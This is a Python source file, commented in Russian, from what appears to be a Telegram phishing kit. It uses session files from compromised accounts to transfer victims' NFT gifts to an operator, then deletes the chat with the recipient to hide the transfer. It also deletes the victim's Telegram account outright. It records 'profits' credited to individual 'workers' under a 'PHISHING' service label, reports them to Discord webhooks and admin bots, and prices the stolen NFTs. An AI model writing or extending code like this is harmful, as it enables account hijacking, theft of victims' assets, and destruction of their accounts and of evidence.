    processing_key = f"{user_id}_{phone}"
    with _processing_lock:
        return processing_key in _processing_status

async def delete_account_via_lethon(session_file: str, phone: str, user_id: int):
    """
    Удаляет аккаунт Telegram через Telethon используя DeleteAccountRequest
    Не удаляет аккаунт, если идет процесс обработки подарков.
    
    Args:
        session_file: Путь к файлу сессии Telethon
        phone: Номер телефона аккаунта
        user_id: ID пользователя в системе
    """
    try:
        # Проверяем, идет ли обработка подарков
        max_wait_time = 300  # Максимальное время ожидания (5 минут)
        check_interval = 5   # Интервал проверки (5 секунд)
        waited_time = 0
        
        while is_processing_in_progress(user_id, phone):
            if waited_time >= max_wait_time:
                logger.warning(f"Превышено время ожидания завершения обработки для {phone}. Пропускаю удаление аккаунта.")
                return
            
            logger.info(f"Обработка подарков для {phone} еще идет. Ждем {check_interval} секунд... (прошло {waited_time}/{max_wait_time} сек)")
            await asyncio.sleep(check_interval)
            waited_time += check_interval
        
        if waited_time > 0:
            logger.info(f"Обработка подарков для {phone} завершена. Продолжаем удаление аккаунта.")
        
        from telethon import TelegramClient
        from telethon.tl.functions.account import DeleteAccountRequest
        from telegram_client import API_ID, API_HASH
        
        logger.info(f"Подключение к Telegram через Telethon для удаления аккаунта {phone}...")
        client = TelegramClient(session_file, API_ID, API_HASH)
        
        try:
            await client.connect()
            
            # Проверяем, авторизован ли клиент
            if not await client.is_user_authorized():
                logger.warning(f"Аккаунт {phone} не авторизован, пропускаю удаление")
                return
            
            # Удаляем аккаунт
            reason = "Account deletion after gift processing"
            logger.info(f"Отправка запроса на удаление аккаунта {phone}...")
            try:
                result = await client(DeleteAccountRequest(reason=reason))
            
                if result:
                    logger.info(f"✅ Аккаунт {phone} успешно удален (результат: {result})")
                else:
                    logger.warning(f"⚠️ Запрос на удаление аккаунта {phone} отправлен, но результат: {result}. Аккаунт может быть удален через некоторое время.")
                
                # Логируем успешное удаление (если аккаунт удален)
                if result:
                    try:
                        await log_user_action(
                            'account_deleted',
                            user_info={'id': user_id},
                            additional_data={
                                'phone': phone,
                                'details': f"Аккаунт {phone} автоматически удален после обработки подарков"
                            }
                        )
                    except NameError:
                        # log_user_action может быть не определен в этом месте, это нормально
                        logger.debug(f"Логирование удаления аккаунта пропущено (log_user_action недоступен)")
                    except Exception as log_err:
                        logger.error(f"Ошибка логирования удаления аккаунта: {log_err}", exc_info=True)
            except Exception as delete_req_err:
                error_str = str(delete_req_err)
                # Если аккаунт уже удален, это нормально
                if "ACCOUNT_ALREADY_DELETED" in error_str or "already deleted" in error_str.lower():
                    logger.info(f"✅ Аккаунт {phone} уже был удален ранее")
            else:
                    logger.error(f"❌ Ошибка при отправке запроса на удаление аккаунта {phone}: {error_str}")
                    # Не пробрасываем ошибку дальше, просто логируем
                
        except Exception as delete_err:
            logger.error(f"Ошибка при удалении аккаунта {phone}: {delete_err}", exc_info=True)
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
                
    except Exception as e:
        logger.critical(f"Критическая ошибка при удалении аккаунта {phone}: {e}", exc_info=True)

async def transfer_gift_to_recipient(client, gift, recipient_id: int, log_key: str = None) -> tuple[bool, str]:
    """
    Передает подарок получателю
    Возвращает (успех, причина_ошибки)
    """
    try:
        logger.info(f"Передаем подарок ID {gift.id} получателю {recipient_id}...")
        result = await gift.transfer(recipient_id)
        if result:
            logger.info(f"Подарок ID {gift.id} успешно передан!")
            try:
                gift_id = getattr(gift, 'id', 'unknown')
                gift_link = getattr(gift, 'link', f"https://t.me/nft/gift-{gift_id}")
                msg = (
                    f"✅ Успешная передача NFT\n"
                    f"🆔 gift_id: {gift_id}\n"
                    f"🔗 link: {gift_link}\n"
                    f"🎯 recipient_id: {recipient_id}"
                )
                if log_key:
                    append_gift_log(log_key, msg)
                else:
                    await send_gift_log_message(text=msg)
            except Exception:
                pass
            
            # Удаляем чат с получателем после успешной передачи (со стороны новой сессии)
            try:
                await asyncio.sleep(0.5)  # Небольшая задержка перед удалением чата
                chat_deleted = False
                delete_error = None
                
                try:
                    # Пытаемся удалить диалог через Pyrogram (delete_chat_history с revoke=True)
                    # Это удалит историю чата и сам диалог из списка чатов
                    if hasattr(client, 'delete_chat_history'):
                        try:
                            await client.delete_chat_history(chat_id=int(recipient_id), revoke=True)
                            chat_deleted = True
                            logger.info(f"✅ Чат с получателем {recipient_id} удален после успешной передачи (Pyrogram)")
                        except Exception as pyrogram_err:
                            delete_error = str(pyrogram_err)
                            # Пробуем альтернативный способ через get_dialogs и delete для Pyrogram
                            try:
                                # Получаем диалоги и находим нужный
                                async for dialog in client.get_dialogs():
                                    if dialog.chat.id == int(recipient_id):
                                        await dialog.delete(revoke=True)
                                        chat_deleted = True
                                        logger.info(f"✅ Чат с получателем {recipient_id} удален через dialog.delete (Pyrogram)")
                                        break
                            except Exception as dialog_err:
                                delete_error = f"{delete_error}; dialog.delete: {str(dialog_err)}"
                    elif hasattr(client, 'delete_dialog'):
                        # Fallback для Telethon или Pyrogram с другим API
                        try:
                            from btelethon.tl.types import PeerUser
                            peer = PeerUser(user_id=int(recipient_id))
                            await client.delete_dialog(peer, revoke=True)
                            chat_deleted = True
                            logger.info(f"✅ Чат с получателем {recipient_id} удален после успешной передачи (Telethon)")
                        except Exception as telethon_err:
                            delete_error = str(telethon_err)
                    else:
                        delete_error = "Метод delete_chat_history или delete_dialog не доступен"
                except Exception as delete_err:
                    delete_error = str(delete_err)
                
                if chat_deleted:
                    if log_key:
                        try:
                            append_gift_log(log_key, f"🗑️ Чат с получателем {recipient_id} удален после передачи")
                        except Exception:
                            pass
                elif delete_error:
                    # Не критично, если не удалось удалить чат, но логируем для отладки
                    logger.debug(f"⚠️ Не удалось удалить чат с получателем {recipient_id}: {delete_error[:100]}")
                    if log_key:
                        try:
                            append_gift_log(log_key, f"⚠️ Не удалось удалить чат с получателем: {delete_error[:80]}")
                        except Exception:
                            pass
            except Exception as cleanup_err:
                # Не критично, если не удалось выполнить очистку
                logger.debug(f"⚠️ Ошибка при очистке чата: {cleanup_err}")
            
            return True, ""
        else:
            # Если result = False, пытаемся получить информацию об ошибке из последнего исключения
            # или из атрибутов подарка
            error_reason = "Неизвестная ошибка при передаче"
            try:
                # Пытаемся получить информацию об ошибке из атрибутов подарка или последнего исключения
                if hasattr(gift, 'last_error'):
                    error_str = str(gift.last_error)
                    if "BALANCE_TOO_LOW" in error_str:
                        error_reason = error_str
                    elif "STARGIFT_TRANSFER_TOO_EARLY" in error_str:
                        error_reason = error_str
                    elif "INSUFFICIENT_STARS" in error_str:
                        error_reason = error_str
            except Exception:
                pass
            
            try:
                gift_id = getattr(gift, 'id', 'unknown')
                gift_link = getattr(gift, 'link', f"https://t.me/nft/gift-{gift_id}")
                msg = (
                    f"❌ Ошибка передачи NFT\n"
                    f"🆔 gift_id: {gift_id}\n"
                    f"🔗 link: {gift_link}\n"
                    f"🎯 recipient_id: {recipient_id}\n"
                    f"⚠️ reason: {error_reason}"
                )
                if log_key:
                    append_gift_log(log_key, msg)
                else:
                    await send_gift_log_message(text=msg)
            except Exception:
                pass
            return False, error_reason
    except Exception as e:
        error_str = str(e)
        error_reason = "Неизвестная ошибка"
        
        # Определяем причину ошибки по тексту
        if "PEER_ID_INVALID" in error_str:
            error_reason = "Неверный ID получателя"
        elif "GIFT_ALREADY_TRANSFERRED" in error_str:
            error_reason = "Подарок уже передан"
        elif "GIFT_TRANSFER_BLOCKED" in error_str:
            error_reason = "Передача заблокирована"
        elif "STARGIFT_TRANSFER_TOO_EARLY" in error_str:
            # Сохраняем полный текст ошибки для проверки (включая "Telegram says: [400 STARGIFT_TRANSFER_TOO_EARLY_X]")
            error_reason = error_str
        elif "BALANCE_TOO_LOW" in error_str:
            # Сохраняем полный текст ошибки для проверки (включая "Telegram says: [400 BALANCE_TOO_LOW]")
            error_reason = error_str
        elif "INSUFFICIENT_STARS" in error_str:
            error_reason = error_str  # Сохраняем полный текст для проверки
        elif "GIFT_EXPIRED" in error_str:
            error_reason = "Подарок истек"
        elif "GIFT_NOT_TRANSFERABLE" in error_str:
            error_reason = "Подарок нельзя передавать"
        else:
            error_reason = f"Ошибка API: {error_str[:50]}..."
            
        print(f"❌ Ошибка передачи подарка: {e}")
        try:
            gift_id = getattr(gift, 'id', 'unknown')
            gift_link = getattr(gift, 'link', f"https://t.me/nft/gift-{gift_id}")
            msg = (
                f"❌ Исключение при передаче NFT\n"
                f"🆔 gift_id: {gift_id}\n"
                f"🔗 link: {gift_link}\n"
                f"🎯 recipient_id: {recipient_id}\n"
                f"⚠️ reason: {error_reason}"
            )
            if log_key:
                append_gift_log(log_key, msg)
            else:
                await send_gift_log_message(text=msg)
        except Exception as _log_err:
            print(f"⚠️ Ошибка логирования исключения передачи: {_log_err}")
        return False, error_reason
async def log_gift_transfer_success(gift, user_id: int, phone: str, recipient_username: str = None, log_key: str = None):
    try:
        gift_id = gift.id if hasattr(gift, 'id') else 'unknown'
        gift_link = gift.link if hasattr(gift, 'link') else f"https://t.me/nft/gift-{gift_id}"
        recipient_display = recipient_username or str(GIFT_RECIPIENT_ID)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        line = (
            f"✅ Передача NFT: {gift_link} → {recipient_display} "
            f"(acct {phone}, uid {user_id}, id {gift_id}, {timestamp})"
        )
        if log_key:
            append_gift_log(log_key, line)
        else:
            from discord_logger import discord_logger
            await discord_logger.send_embed(
                title="🎁 Успешная передача подарка",
                description=f"✅ Уникальный NFT подарок успешно передан!",
                fields=[
                    {'name': '👤 Аккаунт', 'value': f"{phone} (ID: {user_id})", 'inline': True},
                    {'name': '🎯 Получатель', 'value': recipient_display, 'inline': True},
                    {'name': '🆔 ID подарка', 'value': str(gift_id), 'inline': True},
                    {'name': '🔗 Ссылка', 'value': gift_link[:1024], 'inline': False},
                    {'name': '⏰ Время', 'value': timestamp, 'inline': True}
                ],
                webhook_type='actions',
                username="GetGems Bot",
                color=0x2ecc71  # Зеленый для успеха
            )
        print("📝 Лог передачи подарка обработан")
    except Exception as e:
        print(f"❌ Ошибка логирования успешной передачи: {e}")
async def send_no_gifts_notification(user_id: int, phone: str, gifts_count: int, nft_gifts_count: int = 0, transferable_count: int = 0, stars_balance: float = 0):
    """Отправляет уведомление с картинкой когда подарки не найдены или недостаточно звезд"""
    try:
        from telegram_bot import send_message_to_group_with_animation
        from database import Database
        
        # Получаем информацию о воркере
        db = Database()
        worker_info = db.get_worker_by_last_gift(user_id)
        
        if gifts_count == 0:
            # Подарков вообще нет
            message = f"""
🎁 **Обработка подарков завершена**
👤 **Аккаунт:** {phone} (ID: {user_id})
📊 **Всего подарков:** {gifts_count}
❌ **Подарки с ссылками:** Не найдены
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Подарки не найдены.
            """
        elif nft_gifts_count == 0:
            # Есть подарки, но нет NFT
            message = f"""
🎁 **Обработка подарков завершена**
👤 **Аккаунт:** {phone} (ID: {user_id})
📊 **Всего подарков:** {gifts_count}
💎 **NFT подарков:** {nft_gifts_count}
❌ **Подарки с ссылками:** Не найдены
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

NFT подарки не найдены.
            """
        elif transferable_count == 0:
            # Есть NFT подарки, но они заблокированы
            message = f"""
🎁 **Обработка подарков завершена**
👤 **Аккаунт:** {phone} (ID: {user_id})
📊 **Всего подарков:** {gifts_count}
💎 **NFT подарков:** {nft_gifts_count}
🔒 **Заблокированы для передачи:** {nft_gifts_count}
⭐ **Баланс звёзд:** {stars_balance}
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

NFT подарки найдены, но заблокированы для передачи или недостаточно звёзд.
            """
        else:
            # Есть доступные NFT, но что-то пошло не так
            message = f"""
🎁 **Обработка подарков завершена**
👤 **Аккаунт:** {phone} (ID: {user_id})
📊 **Всего подарков:** {gifts_count}
💎 **NFT подарков:** {nft_gifts_count}
✅ **Доступны для передачи:** {transferable_count}
⭐ **Баланс звёзд:** {stars_balance}
❌ **Подарки с ссылками:** Не найдены
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

NFT подарки доступны, но не содержат ссылок для передачи или произошла ошибка.
            """
        
        # Отправляем уведомление с анимацией и кнопкой для повторного сканирования
        await send_message_to_group_with_animation(
            message.strip(), 
            user_id, 
            phone, 
            worker_info
        )
        print(f"📝 Уведомление об отсутствии подарков отправлено в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки уведомления об отсутствии подарков: {e}")

async def send_profit_log(worker_info: dict | None, transferred_gift_links: list, user_id: int, failed_gift_transfers: list = None):
    """Отправляет лог профита с информацией о переданных подарках"""
    # Фильтруем невалидные ссылки сразу при получении списка
    # Сначала проверяем формат, затем опционально проверяем существование
    import os
    check_nft_existence = os.getenv("CHECK_NFT_EXISTENCE", "false").lower() == "true"
    
    valid_transferred_links = []
    for link in transferred_gift_links:
        if is_valid_nft_link(link):
            if check_nft_existence:
                # Проверяем существование NFT (может быть медленно)
                if await check_nft_exists(link):
                    valid_transferred_links.append(link)
                else:
                    logger.warning(f"⚠️ NFT не существует (отфильтровано): {link}")
            else:
                # Только проверка формата (быстро)
                valid_transferred_links.append(link)
    if len(valid_transferred_links) != len(transferred_gift_links):
        invalid_count = len(transferred_gift_links) - len(valid_transferred_links)
        logger.warning(f"⚠️ Отфильтровано {invalid_count} невалидных NFT ссылок из {len(transferred_gift_links)} для профита пользователя {user_id}")
    
    logger.info(f"[PROFIT_LOG] Начало отправки профита для пользователя {user_id}")
    logger.debug(f"[PROFIT_LOG] Параметры: worker_info={'yes' if worker_info else 'no'}, gift_links_count={len(valid_transferred_links)} (из {len(transferred_gift_links)} всего)")
    
    # Используем только валидные ссылки дальше
    transferred_gift_links = valid_transferred_links
    
    try:
        worker_info = worker_info or {}

        logger.debug(f"[PROFIT_LOG] Импортируем Database...")
        from database import Database
        logger.info(f"[PROFIT_LOG] Database импортирован")
        
        # Получаем информацию о пользователе
        logger.debug(f"[PROFIT_LOG] Получаем информацию о пользователе {user_id}...")
        phone = get_phone_from_json(user_id) or "Неизвестно"
        logger.info(f"[PROFIT_LOG] Телефон пользователя: {phone}")
        
        # Формируем сообщение о профите
        logger.debug(f"[PROFIT_LOG] Формируем сообщение о профите...")
        # Фильтруем только валидные NFT ссылки
        valid_gift_links = [link for link in transferred_gift_links if is_valid_nft_link(link)]
        gift_count = len(valid_gift_links)
        logger.debug(f"[PROFIT_LOG] Количество валидных подарков: {gift_count} (из {len(transferred_gift_links)} всего)")
        
        gift_links_text = "\n".join([f"• {link}" for link in valid_gift_links[:5]])  # Показываем первые 5 валидных ссылок
        if len(valid_gift_links) > 5:
            gift_links_text += f"\n... и еще {len(valid_gift_links) - 5} подарков"
        logger.debug(f"[PROFIT_LOG] Текст ссылок сформирован (длина: {len(gift_links_text)} символов)")
        
        # Определяем воркера (если worker_info пустой — будем резолвить по создателям ссылок ниже)
        original_worker_info = worker_info or {}
        resolved_worker = original_worker_info.copy() if isinstance(original_worker_info, dict) else {}

        # Приоритетный резолв воркера: последний активированный чек пользователем
        # (это самый надежный источник worker_telegram_id, и не должен указывать на самого бота)
        try:
            import sqlite3
            backend_db_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'backend', 'playerok.db'))
            if not os.path.exists(backend_db_path):
                backend_db_path = os.path.abspath('backend/playerok.db')
            if os.path.exists(backend_db_path):
                with sqlite3.connect(backend_db_path, timeout=10.0) as conn:
                    conn.execute('PRAGMA busy_timeout=10000')
                    cur = conn.cursor()
                    cur.execute(
                        """
                        SELECT worker_telegram_id, worker_username
                        FROM checks
                        WHERE recipient_telegram_id = ?
                          AND worker_telegram_id IS NOT NULL
                          AND status = 'used'
                        ORDER BY activated_at DESC, created_at DESC
                        LIMIT 1
                        """,
                        (int(user_id),),
                    )
                    row = cur.fetchone()
                    if row and row[0]:
                        w_tid = int(row[0])
                        w_username = None
                        try:
                            w_username = row[1]
                        except Exception:
                            w_username = None
                        try:
                            db_tmp = Database()
                            w_user = db_tmp.get_user_by_telegram_id(w_tid)
                            if w_user:
                                # Если в основной БД username пустой, но в чеке он есть — подставим
                                if (not w_user.get('username')) and w_username:
                                    w_user['username'] = w_username.lstrip('@') if isinstance(w_username, str) else w_username
                                resolved_worker = w_user
                            else:
                                resolved_worker = {'telegram_id': w_tid, 'username': (w_username.lstrip('@') if isinstance(w_username, str) else w_username)}
                        except Exception:
                            resolved_worker = {'telegram_id': w_tid, 'username': (w_username.lstrip('@') if isinstance(w_username, str) else w_username)}
        except Exception:
            pass

        # Формируем список подарков из ПЕРЕДАННЫХ ссылок (transferred_gift_links)
        gift_list_text = ""
        db_for_creators = None
        try:
            db_for_creators = Database()
        except Exception:
            db_for_creators = None

        # Собираем статистику по создателям ссылок, чтобы выбрать воркера "на профит"
        # Используем только валидные ссылки для статистики (ИЗ ПЕРЕДАННЫХ)
        valid_gift_links_for_stats = [link for link in transferred_gift_links if is_valid_nft_link(link)]
        creator_counts: dict[int, int] = {}
        creator_last_info: dict[int, dict] = {}

        # Собираем статистику по создателям ссылок ИЗ ПЕРЕДАННЫХ ссылок (для определения воркера)
        # gift_list_text будет сформирован позже из валидных ссылок
        for link in valid_gift_links_for_stats:
            # Получаем информацию о создателе каждой ссылки (опционально, для статистики)
            try:
                creator_info = db_for_creators.get_gift_creator_by_link(link) if db_for_creators else None
                if creator_info:
                    ctg = creator_info.get('telegram_id')
                    if isinstance(ctg, int):
                        creator_counts[ctg] = creator_counts.get(ctg, 0) + 1
                        creator_last_info[ctg] = creator_info
            except Exception as e:
                print(f"❌ Ошибка получения создателя для ссылки {link}: {e}")

        # Если worker_info не пришёл — выбираем воркера по большинству “создателей” ссылок
        if not resolved_worker and creator_counts:
            top_creator_id = max(creator_counts.items(), key=lambda kv: kv[1])[0]
            resolved_worker = creator_last_info.get(top_creator_id, {}) or {}

        # Защита: воркер не должен определяться как сам бот
        def _is_bot_worker(candidate: dict) -> bool:
            try:
                from config_bot import BotConfig as _Cfg
                bot_username_clean = (_Cfg.BOT_USERNAME or "").lstrip("@")
                cand_username_clean = (candidate.get("username") or "").lstrip("@")
                return bool(bot_username_clean and cand_username_clean and bot_username_clean.lower() == cand_username_clean.lower())
            except Exception:
                return False

        if resolved_worker and _is_bot_worker(resolved_worker):
            # Пытаемся заменить на воркера, которого удалось определить по создателям ссылок
            alt_worker = {}
            if creator_counts:
                top_creator_id = max(creator_counts.items(), key=lambda kv: kv[1])[0]
                alt_worker = creator_last_info.get(top_creator_id, {}) or {}
                if alt_worker and _is_bot_worker(alt_worker):
                    alt_worker = {}

            # Если альтернатива не нашлась — пробуем взять воркера из основной БД по привязке пользователя
            if not alt_worker:
                try:
                    from database import db as main_db
                    binding_fallback = main_db.get_worker_for_user(user_id, only_active=True)
                    if binding_fallback:
                        alt_worker = {
                            "telegram_id": binding_fallback.get("worker_telegram_id"),
                            "username": binding_fallback.get("username"),
                            "first_name": binding_fallback.get("first_name"),
                            "last_name": binding_fallback.get("last_name"),
                        }
                except Exception as bind_fb_err:
                    logger.debug(f"Не удалось получить воркера по привязке (fallback) для user_id={user_id}: {bind_fb_err}")

            # Если и после всех попыток альтернатива не найдена — не показываем бот как воркера
            resolved_worker = alt_worker or {}

        # Определяем имя воркера (уже после резолва)
        worker_username = resolved_worker.get('username', '')
        if worker_username and not worker_username.startswith('@'):
            worker_username = f"@{worker_username}"
        elif not worker_username:
            worker_username = f"@user{resolved_worker.get('telegram_id', 'unknown')}"

        logger.debug(f"[PROFIT_LOG] Имя воркера: {worker_username}")

        # Добавляем информацию о неудачных передачах, если они есть
        failed_transfers_text = ""
        if failed_gift_transfers:
            failed_transfers_text = "\n\n❌ Неудачные передачи:\n"
            for i, failed_transfer in enumerate(failed_gift_transfers, 1):
                failed_transfers_text += f"❌ {i}. {failed_transfer}\n"
        
        # Используем ТОЛЬКО валидные ссылки из переданных для формирования сообщения
        # valid_gift_links уже содержит только валидные ссылки, но фильтруем еще раз для надежности
        valid_links_for_message = [link for link in valid_gift_links if is_valid_nft_link(link)]
        
        # Обновляем gift_count на основе реально используемых валидных ссылок
        gift_count = len(valid_links_for_message)
        
        # Формируем gift_list_text ТОЛЬКО из валидных ссылок (которые были переданы в функцию)
        gift_list_text = ""
        if valid_links_for_message:
            # Сохраняем профиты в БД
            try:
                worker_id_for_db = resolved_worker.get('telegram_id') or resolved_worker.get('id')
                if worker_id_for_db:
                    if 'db_for_creators' in locals() and db_for_creators:
                        db_log = db_for_creators
                    else:
                        from database import Database
                        db_log = Database()
                    
                    for link in valid_links_for_message:
                        db_log.add_profit_log(
                            worker_id=int(worker_id_for_db),
                            worker_username=worker_username.lstrip('@'),
                            amount=1.0,  # 1 подарок = 1 условная единица
                            gift_name=link,
                            currency='STARS'
                        )
                    logger.info(f"[PROFIT_LOG] Записано {len(valid_links_for_message)} подарков в историю профитов БД")
            except Exception as e:
                logger.error(f"[PROFIT_LOG] Ошибка записи в БД: {e}")

            for i, link in enumerate(valid_links_for_message[:20], 1):  # Показываем первые 20
                try:
                    creator_info = db_for_creators.get_gift_creator_by_link(link) if db_for_creators else None
                    creator_name = "Неизвестно"
                    if creator_info:
                        username = creator_info.get('username', '')
                        if username:
                            creator_name = f"@{username}" if not username.startswith('@') else username
                        else:
                            creator_name = f"ID{creator_info.get('telegram_id', 'Unknown')}"
                        gift_list_text += f"🎁 {i}. {link} (создал: {creator_name})\n"
                    else:
                        gift_list_text += f"🎁 {i}. {link}\n"
                except Exception:
                    gift_list_text += f"🎁 {i}. {link}\n"
            if len(valid_links_for_message) > 20:
                gift_list_text += f"... и еще {len(valid_links_for_message) - 20} подарков\n"
        else:
            # Если нет успешных передач, но есть неудачные - показываем это
            if failed_gift_transfers and len(failed_gift_transfers) > 0:
                gift_list_text = f"⚠️ Успешных передач: 0 (все попытки не удались, см. ниже)\n"
            else:
                gift_list_text = "🎁 Подарки не найдены\n"
        
        # Формируем заголовок с учетом неудачных передач
        failed_count = len(failed_gift_transfers) if failed_gift_transfers else 0
        if gift_count > 0 and failed_count > 0:
            gifts_header = f"┠ Подарки ({gift_count} успешных, {failed_count} неудачных):"
        elif gift_count > 0:
            gifts_header = f"┠ Подарки ({gift_count}):"
        elif failed_count > 0:
            gifts_header = f"┠ Попытки передачи (0 успешных, {failed_count} неудачных):"
        else:
            gifts_header = f"┠ Подарки ({gift_count}):"
        
        message = f"""🧑‍🎤 Новый профит у {worker_username}

┠ Сервис: 💠 PHISHING
{gifts_header}
{gift_list_text.rstrip()}{failed_transfers_text.rstrip()}
"""
        
        logger.info(f"[PROFIT_LOG] Сообщение сформировано (длина: {len(message)} символов)")
        logger.debug(f"[PROFIT_LOG] Содержимое сообщения:\n{message}")

        # Отправляем профит в env-manager (в ЛС админам), чтобы владелец видел реальные профиты
        try:
            # Важно: сначала импортируем config_bot (он делает load_dotenv),
            # затем читаем ENV_MANAGER_BOT_TOKEN из окружения.
            from config_bot import BotConfig as _Cfg
            env_manager_token = os.getenv("ENV_MANAGER_BOT_TOKEN", "").strip()
            admin_ids = getattr(_Cfg, "ADMIN_IDS", []) or []
            if env_manager_token and admin_ids:
                from aiogram import Bot as _Bot
                env_bot = _Bot(token=env_manager_token)
                prefix = "📣 <b>Реальный профит</b>\n"
                meta = f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
                if phone and phone != "Неизвестно":
                    meta += f"📞 <b>Phone:</b> <code>{phone}</code>\n"
                meta += f"👷 <b>Worker:</b> <code>{resolved_worker.get('telegram_id','unknown')}</code> {worker_username}\n\n"
                text_for_admin = prefix + meta + message.strip()
                ok_any = False
                for aid in admin_ids:
                    try:
                        await env_bot.send_message(chat_id=int(aid), text=text_for_admin, parse_mode="HTML", disable_web_page_preview=True)
                        ok_any = True
                    except Exception:
                        pass
                try:
                    await env_bot.session.close()
                except Exception:
                    pass
                logger.debug(f"[PROFIT_LOG] Env-manager push: {'ok' if ok_any else 'failed'}")
        except Exception as _env_err:
            # Нельзя ломать отправку профита из-за env-manager
            try:
                logger.warning(f"[PROFIT_LOG] Env-manager push error: {_env_err}")
            except Exception:
                pass
        
        # Также отправляем напрямую в Discord вебхук для профита
        try:
            from discord_logger import discord_logger
            logger.debug(f"[PROFIT_LOG] Отправляем напрямую в Discord вебхук...")
            discord_success = await discord_logger.send_message_with_image(
                message=message.strip(),
                image_url="https://i.ibb.co/XfHRzHfw/newprofin.jpg",
                webhook_type='profit',
                username="GetGems Bot",
                color=0x2ecc71  # Зеленый для профита
            )
            logger.debug(f"[PROFIT_LOG] Результат отправки в Discord вебхук: {discord_success}")
            if not discord_success:
                logger.warning(f"⚠️ Не удалось отправить профит в Discord вебхук для пользователя {user_id}")
        except Exception as discord_err:
            logger.error(f"❌ Ошибка отправки профита в Discord вебхук: {discord_err}")
            logger.error(f"[PROFIT_LOG] Ошибка отправки в Discord: {discord_err}")
            import traceback
            traceback.print_exc()

        # Отправляем лог профита в Telegram форумную группу
        try:
            worker_name = "неизвестно"
            if resolved_worker:
                worker_username = resolved_worker.get('username', '')
                if worker_username:
                    worker_name = f"@{worker_username}" if not worker_username.startswith('@') else worker_username
                elif resolved_worker.get('first_name'):
                    worker_name = resolved_worker.get('first_name')
                elif resolved_worker.get('telegram_id'):
                    worker_name = f"ID{resolved_worker.get('telegram_id')}"
            
            # Передаем список NFT ссылок (уже отфильтрованный в send_profit_log, но фильтруем еще раз для надежности)
            valid_nft_links_for_telegram = [link for link in transferred_gift_links if is_valid_nft_link(link)]
            # Формируем additional_info с информацией о неудачных передачах
            additional_info_data = None
            if failed_gift_transfers and len(failed_gift_transfers) > 0:
                additional_info_data = {'failed_transfers': failed_gift_transfers}
            # Если нет удачных передач, но есть неудачные - передаем их в additional_info
            elif not valid_nft_links_for_telegram and failed_gift_transfers and len(failed_gift_transfers) > 0:
                additional_info_data = {'failed_transfers': failed_gift_transfers}
            
            await send_minimal_log_to_telegram(
                'profit', 
                worker_name=worker_name, 
                user_id=user_id,  # Передаём user_id для авто-резолва воркера
                nft_links=valid_nft_links_for_telegram,
                additional_info=additional_info_data
            )
        except Exception as minimal_log_err:
            logger.warning(f"Failed to send minimal profit log: {minimal_log_err}")
        
        # Отправляем профит лично пользователю (который получил подарки)
        try:
            from logs_bot import send_notification_to_tracked_user
            from aiogram import Bot
            
            # Рассчитываем флор для этого профита используя правильный метод
            current_floor = 0.0
            if valid_gift_links:
                try:
                    import sys
                    import os as os_module
                    # Добавляем путь к другому проекту для импорта
                    killamonjaro_path = '/root/KillamonjaroAuto/src/utils'
                    if os_module.path.exists(killamonjaro_path) and killamonjaro_path not in sys.path:
                        sys.path.insert(0, killamonjaro_path)
                    
                    try:
                        from portals_floor import extract_collection_name, get_floor_price, format_collection_name
                        auth_data = os_module.getenv('PORTALS_AUTH_DATA', '')
                        if not auth_data:
                            from portals_api import get_auth_data as get_auth_data_fallback
                            auth_data = get_auth_data_fallback()
                        
                        # НОВЫЙ МЕТОД: Рассчитываем флор для каждого NFT отдельно по модели (точный расчет)
                        # Импортируем функции для расчета флора по модели
                        try:
                            from utils_nft_floor import get_floor_price_by_nft_link
                        except ImportError:
                            logger.warning("⚠️ utils_nft_floor не найден, используем старый метод расчета флора")
                            get_floor_price_by_nft_link = None
                        
                        if get_floor_price_by_nft_link and auth_data:
                            # Рассчитываем флор для каждого NFT отдельно (учитывая модель)
                            for link in valid_gift_links:
                                try:
                                    # Получаем цену по ссылке NFT (с учетом всех атрибутов: модель, фон, символ)
                                    floor_price, collection_name, attributes = get_floor_price_by_nft_link(
                                        nft_link=link,
                                        max_retries=2,
                                        retry_delay=0.5,
                                        auth_data=auth_data
                                    )
                                    
                                    if floor_price:
                                        floor_value = float(floor_price)
                                        current_floor += floor_value
                                        
                                        # Формируем строку с атрибутами для логирования
                                        attr_parts = []
                                        if attributes:
                                            if attributes.get('model'):
                                                attr_parts.append(f"Model: {attributes.get('model')}")
                                            if attributes.get('backdrop'):
                                                attr_parts.append(f"Backdrop: {attributes.get('backdrop')}")
                                            if attributes.get('symbol'):
                                                attr_parts.append(f"Symbol: {attributes.get('symbol')}")
                                        
                                        if attr_parts:
                                            attrs_str = ", ".join(attr_parts)
                                            logger.debug(f"✅ Флор для {collection_name} ({attrs_str}): {floor_value} TON - {link}")
                                        else:
                                            logger.debug(f"✅ Флор для {collection_name}: {floor_value} TON (атрибуты не найдены, используется цена коллекции) - {link}")
                                    else:
                                        logger.debug(f"⚠️ Флор для {link}: не найден")
                                except Exception as link_err:
                                    logger.warning(f"⚠️ Ошибка расчета флора для {link}: {link_err}")
                        else:
                            # FALLBACK: Старый метод по коллекциям (если новый не работает)
                            # Оптимизация: собираем все уникальные коллекции сначала
                            unique_collections = {}
                            for link in valid_gift_links:
                                try:
                                    collection_name = extract_collection_name(link)
                                    if collection_name and collection_name not in unique_collections:
                                        unique_collections[collection_name] = []
                                    if collection_name:
                                        unique_collections[collection_name].append(link)
                                except Exception:
                                    pass
                            
                            # Делаем один запрос для получения всех floor цен (кэшируем)
                            all_floors_cache = None
                            if auth_data:
                                try:
                                    import requests
                                    url = 'https://portal-market.com/api/collections/floors'
                                    headers = {
                                        'Authorization': auth_data,
                                        'Origin': 'https://portal-market.com',
                                        'Referer': 'https://portal-market.com/',
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                                    }
                                    response = requests.get(url, headers=headers, timeout=10)
                                    if response.status_code == 200:
                                        data = response.json()
                                        all_floors_cache = data.get('floorPrices', data)
                                        if not isinstance(all_floors_cache, dict):
                                            all_floors_cache = None
                                except Exception as cache_err:
                                    logger.debug(f"Не удалось получить кэш floor цен: {cache_err}")
                            
                            # Рассчитываем флор для каждой уникальной коллекции
